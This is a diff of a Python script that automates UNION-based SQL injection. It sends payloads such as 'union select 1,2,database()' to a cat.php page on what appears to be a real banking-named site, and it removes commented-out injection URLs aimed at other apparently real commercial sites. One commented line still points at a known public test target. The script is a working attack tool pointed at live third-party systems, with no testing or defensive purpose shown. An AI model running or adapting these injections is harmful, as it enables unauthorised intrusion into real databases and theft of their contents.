@@ -2,13 +2,11 @@ import requests
 from icecream import ic
 
 
-WORD = "yasmim"
+WORD = "WORD"
 DATABASE = "database()"
 
 url_global = None
 url_global = "http://www.bancocn.com/cat.php?id=1"
-#url_global = "https://minasca.com.br/single-produtos.php?id=1"
-#url_global = "http://www.promix.com.br/produtos/categoria.php?cat=1"
 #url_global = "http://testphp.vulnweb.com/listproducts.php?cat=1"
 
 def url():
@@ -71,8 +69,7 @@ def url_maker():
 def get_response_query():
     
     url_global = f"http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,'{WORD}'"
-    #URL = f"https://minasca.com.br/single-produtos.php?id=1%27union%20select%201,'{WORD}',3%20--%20%27"
-    #URL = f"http://www.promix.com.br/produtos/categoria.php?cat=-1%20union%20select%201,2,'{WORD}'"
+
     
     response = requests.get(url_global)
     if response.status_code == 200:
@@ -109,8 +106,6 @@ def trash_content():
 ## FUNCAO QUE INJETA O DATABASE() E RETORNA O HTML CONTENT INTEIRO DO INJECTION
 def get_database():
     URL = f"http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,{DATABASE}"
-    #URL = f"https://minasca.com.br/single-produtos.php?id=1%27union%20select%201,{DATABASE},3%20--%20%27"
-    #URL = f"http://www.promix.com.br/produtos/categoria.php?cat=-1%20union%20select%201,2,{DATABASE}"
     
     response = requests.get(URL)
     if response.status_code == 200:
